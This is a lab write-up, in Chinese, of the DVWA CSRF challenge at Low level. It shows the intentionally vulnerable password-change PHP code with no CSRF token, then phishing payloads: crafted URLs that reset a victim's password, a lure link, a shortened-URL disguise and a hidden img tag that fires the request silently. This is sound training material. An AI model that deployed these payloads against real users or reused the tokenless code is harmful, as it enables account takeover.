# CSRF - Low

## View Source

```PHP
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

- [`isset()`](https://www.php.net/manual/zh/function.isset.php)
    - 檢查變數是否已設置
    - I.e., *Change* 按鈕按下去
- [`mysqli_real_escape_string()`](https://www.php.net/manual/zh/mysqli.real-escape-string.php)
    - 會過濾 `NUL（ASCII 0)`、`\n`、`\r` 等字元來防止 SQLi

### 身分驗證

- `docker exec -it dvwa /bin/bash`
    - 進入 docker
- `vim /var/www/html/dvwa/includes/dvwaPage.inc.php`
    - https://github.com/digininja/DVWA/blob/master/dvwa/includes/dvwaPage.inc.php#L79-L153
- *Console* 輸入 `document.cookie` 可以看到 `"PHPSESSID=5ko63c60bbq3ebg69pjdsvihc1; security=low"`

## Code Review

- 只透過 *L14* 檢查使用者輸入的兩個密碼是否相同
- 密碼相同則 *L20* 就做 *md5* 後更新進資料庫
- 點擊 *Change* 按鈕後發出 *request* 包含 *cookie* 和輸入的新密碼
    - E.g., `http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#`
    - 透過 *Cookie* 的 `PHPSESSID` 來判斷發出 *request* 的使用者身分

## Answer

- 搭配社交工程，發揮創意！
    - E.g., 構造惡意的釣魚連結來誘騙使用者點擊
        - `http://127.0.0.1/vulnerabilities/csrf/?password_new=<Attacker>&password_conf=<Attacker>&Change=Change#`
    - E.g., 釣魚網站包含惡意的連結
        - `<a href="http://127.0.0.1/vulnerabilities/csrf/?password_new=<Attacker>&password_conf=<Attacker>&Change=Change#">View my Pictures!</a>`
    - E.g., 可搭配短網址來隱藏
        - `https://bit.ly/3iF8Sxi`
        - `<a href="https://bit.ly/3iF8Sxi">View my Pictures!</a>`

### Example

```
<a href="http://127.0.0.1/vulnerabilities/csrf/?password_new=<Attacker>&password_conf=<Attacker>&Change=Change#">View my Pictures!</a>
<img src="https://bit.ly/3iF8Sxi" width="0" height="0" border="0" style="display:none">
```

### Note

> 驗證密碼有沒有改成功可以到 *Brute Force* 嘗試
> 忘記自己密碼改成什麼的話可以到 *Setup / Reset DB* 重設資料庫 Or 還原 *Virtual Machine* 快照等